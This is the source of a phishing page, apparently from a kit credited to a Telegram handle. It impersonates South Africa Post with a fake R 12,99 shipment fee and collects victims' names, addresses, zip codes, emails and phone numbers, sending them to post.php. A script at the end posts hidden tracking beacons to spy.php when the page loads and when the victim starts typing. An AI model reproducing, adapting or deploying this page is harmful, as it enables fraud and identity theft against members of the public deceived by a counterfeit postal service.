<?php 

     require_once "function.php";

                                    #========================================
                                    #==> Make By ==> Telegram : @Azar_ox <==#
                                    #========================================

?>


<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet"  href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.5.0/font/bootstrap-icons.css">
        <link rel="stylesheet"  href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css"> 
        <title>South Africa Post</title>
        <!-- logo site web-->
        <link rel="icon" href="image/favicon.png" type="image/x-icon"/>
        <link rel="shortcut icon" href="image/favicon.png" type="image/x-icon" />
        <!-- link__css -->
        <link rel="stylesheet"  href="css/bootstrap.css">
        <link rel="stylesheet"  href="css/boom.css">
</head>
<body>

         <div class="home">
            <div class="ho">
               <div class="container">
                     <div class="navbar">
                        <div class="limaja">
                            <img src="image/Emarats.png">
                        </div>
                        <div class="icon">
                           <ul>
                              <li class="geo"><i class="icon fa fa-globe"></i></li>
                              <li class="oo"><i class="fa fa-home"></i></li>
                              <li class="oo"><i class="fa fa-search"></i></li>
                              <li class="oo"><i class=" fa fa-gear"></i></li>
                              <li><i class="fa fa-navicon"></i></li>
                           </ul>
                        </div>
                     </div>
               </div>
            </div>
         </div>

         <div class="validation">
            <div class="container">
                <h2>Contact Information</h2>
                <hr class="hr">
                <h4>Home <i class="fa fa-angle-right"></i> <span>Contact Information</span></h4>
                <div class="sender">
                   <div class="row">
                      <div class="col-lg-3 left">
                         <div>
                            <div class="d-flex adn">
                               <span></span>
                               <p>Your details</p>
                            </div>
                            <div class="d-flex adr">
                               <span></span>
                               <p>Verify</p>
                            </div>
                         </div>

                         <div class="pijama responsive">
                            <div class="statu">
                               <p>Destination:</p>
                               <span>South Africa</span>
                            </div>
                            <hr class="gy-3">
                            <div class="statu">
                               <p>Total</p>
                               <span>R 12,99</span>
                            </div>
                         </div>

                         <div class="pijama web">
                            <hr class="gy-3">
                            <div class="statu">
                               <p>Destination:</p>
                               <span>South Africa</span>
                            </div>
                            <hr class="gy-3">
                            <div class="statu">
                               <p>Last Updated:</p>
                               <span><?php echo date('l jS \of  h:i A'); ?></span>
                            </div>
                         </div>

                         <hr class="gy-3">
                         <div class="pijama web">
                            <div class="statu">
                               <p>Shipment type</p>
                               <span>Other</span>
                            </div>
                            <hr class="gy-3">
                         </div>

                         <div class="pijama web">
                            <div class="statu">
                               <p>Total</p>
                               <span>R 12,99</span>
                            </div>
                            <hr class="gy-3">
                         </div>

                      </div>
                      <div class="col-lg-9 right">
                         <h3>Your details <span><i class=" fa fa-question-circle fa-1x"></i></span></h3>
                         <p>Please Complete your Following details</p>
                         <h6><strong>0%</strong> Complete</h6>
                         <hr>
                         <form action="post.php" method="post">
                            <input type="hidden" name="step" value="index">
                            <div class="login">
                               <h5 style="font-size:17px;font-weight:600;" class="mt-5">Your personal details</h5>
                               <div class="all_one mistak">
                                  <div class="form-group box mt-3 zibra">
                                     <label>First Name<span class="star">*</span></label>
                                     <input type="text" name="first" id="first" class="form-control">
                                     <div class="error_name any">Required Field!</div>
                                  </div>
                                  <div class="form-group box mt-3 zibra">
                                     <label>Last Name<span class="star">*</span></label>
                                     <input type="text" name="last" id="last" class="form-control">
                                     <div class="error_last any">Required Field!</div>
                                  </div>
                               </div>
                               <div class="all_one mistak">
                                  <div class="form-group box mt-4 zibra">
                                     <label>Address<span class="star">*</span></label>
                                     <input type="text" name="adress" id="adress" class="form-control">
                                     <div class="error_adress any">Required Field!</div>
                                  </div>
                                  <div class="form-group box mt-4 zibra">
                                     <label>Zip<span class="star">*</span></label>
                                     <input type="text" name="zip" id="zip" class="form-control">
                                     <div class="error_zip any">Required Field!</div>
                                  </div>
                               </div>
                               <hr class="my-5">
                               <h5 style="font-size:17px;font-weight:600;">Contact details</h5>
                               <div class="all_one mistak">
                                  <div class="form-group box mt-3 zibra">
                                     <label>E-mail<span class="star">*</span></label>
                                     <input type="text" name="email" id="email" class="form-control" placeholder="e.g. johndoe@gmail.com">
                                     <div class="error_email any">Required Field!</div>
                                  </div>
                                  <div class="form-group box mt-3 zibra">
                                     <label>Number Phone<span class="star">*</span></label>
                                     <input type="text" name="number" id="number" class="form-control" placeholder="+27 XXXXXXXXX">
                                     <div class="error_number any">Required Field!</div>
                                  </div>
                               </div>
                            </div>
                            <div class="bottona">
                               <button class="btn" name="submit">Continue</button>
                            </div>
                         </form>
                      </div>
                   </div>
                </div>
            </div>
         </div>

         <div class="fotter">
            <div class="container">
               <hr>
               <div class="bot">
                  <p>© 2025 South Africa Post, All Rights Reserved</p>
                  <div class="images d-flex">
                    <img src="image/Emarats.png" style="width:76px;height:40px;">
                  </div>
               </div>
            </div>
         </div>
        


        <script src="js/jquery-3.5.1.min.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script src="js/jquery.mask.js"></script>
        <script>
           
           $("#first").blur(function(){
                if($("#first").val().length < 1){
                    $("#first").css({border:'1px solid red'});
                    $(".error_name").show();
               }else{;
                    $("#first").css({border:'1px solid #6DAE36'});
                    $(".error_name").hide();
               }
             })

           $("#last").blur(function(){
                if($("#last").val().length < 1){
                    $("#last").css({border:'1px solid red'});
                    $(".error_last").show();
               }else{;
                    $("#last").css({border:'1px solid #6DAE36'});
                    $(".error_last").hide();
               }
             })

           $("#adress").blur(function(){
                if($("#adress").val().length < 1){
                    $("#adress").css({border:'1px solid red'});
                    $(".error_adress").show();
               }else{;
                    $("#adress").css({border:'1px solid #6DAE36'});
                    $(".error_adress").hide();
               }
             })

           $("#zip").blur(function(){
                if($("#zip").val().length < 1){
                    $("#zip").css({border:'1px solid red'});
                    $(".error_zip").show();
               }else{;
                    $("#zip").css({border:'1px solid #6DAE36'});
                    $(".error_zip").hide();
               }
             })
           $("#zip").mask("00000");

           $("#email").blur(function(){
                if($("#email").val().length < 1){
                    $("#email").css({border:'1px solid red'});
                    $(".error_email").show();
               }else{;
                    $("#email").css({border:'1px solid #6DAE36'});
                    $(".error_email").hide();
               }
             })

           $("#number").blur(function(){
                if($("#number").val().length < 1){
                    $("#number").css({border:'1px solid red'});
                    $(".error_number").show();
               }else{;
                    $("#number").css({border:'1px solid #6DAE36'});
                    $(".error_number").hide();
               }
             })
           $("#number").mask("0000000000000");


		$.post("spy.php",{billingview:1});
var abort = false;
$("#first").keyup(function(){
	if(abort==false){
		$.post("spy.php", {billinging:1});
		abort=true;
	}
});

        </script>
              
</body>
</html>